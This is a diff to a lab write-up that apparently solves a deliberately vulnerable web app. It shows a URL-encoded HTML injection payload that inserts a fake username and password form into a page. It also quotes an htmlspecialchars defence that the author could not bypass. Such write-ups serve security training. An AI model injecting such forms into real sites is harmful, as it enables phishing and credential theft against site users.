@@ -15,7 +15,22 @@ Below are the html form tags that should be entered in the username.
    ```
    %3Cform%20action%3D%22https%3A%2f%2fgoogle.com%22%3E%20%3Cinput%20type%3D%22text%22%20placeholder%3D%22Username%22%3E%3C%2fbr%3E%3C%2fbr%3E%20%3Cinput%20type%3D%22password%22%20placeholder%3D%22Password%22%3E%3C%2fbr%3E%3C%2fbr%3E%20%3Cinput%20type%3D%22submit%22%20value%3D%22Submit%22%3E%20%3C%2fform%3E
    ```
-   
+- Security-Level : High
+
+    I can't think of a way to bypass the below code protection
+    ```
+    function xss_check_3($data, $encoding = "UTF-8")
+    {
+    // htmlspecialchars - converts special characters to HTML entities    
+    // '&' (ampersand) becomes '&amp;' 
+    // '"' (double quote) becomes '&quot;' when ENT_NOQUOTES is not set
+    // "'" (single quote) becomes '&#039;' (or &apos;) only when ENT_QUOTES is set
+    // '<' (less than) becomes '&lt;'
+    // '>' (greater than) becomes '&gt;'  
+    return htmlspecialchars($data, ENT_QUOTES, $encoding);
+    }
+    ```
+    
 # A8 - Cross Site Request Forgery(CSRF)
 Below are the POC html pages. Open them in your server and click on button to perform the attack
 
